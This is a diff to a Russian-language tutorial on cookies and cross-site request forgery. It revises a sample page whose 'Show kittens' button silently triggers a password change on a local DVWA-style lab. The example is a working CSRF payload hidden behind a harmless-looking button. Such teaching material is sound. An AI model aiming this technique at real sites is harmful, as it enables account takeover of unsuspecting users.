@@ -219,15 +219,12 @@ Cookies.Спецификация протокола HTTP/1.1 определяе�
 запрос `http://localhost:8080/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change` и в запросе
 отправляются Cookie с сессией `PHPSESSID=eu5ebmk29rfl9g3rig10ljftr0`.
 
-Возьмем страницу [test.html](example/test.html) c кнопкой `Show kittens`, которая будет отправлять запрос на сервер со
+Возьмем страницу [test.html](example/test.html) с кнопкой `Show kittens`, которая будет отправлять запрос на сервер со
 сменой пароля.
 
 ```javascript
 function showKittens() {
-    const http = new XMLHttpRequest();
-    http.open("GET", "http://localhost:8080/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change");
-    http.send();
-    http.onload = () => console.log(http.responseText);
+    window.location = "http://localhost:8080/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change"
 }
 ```
 
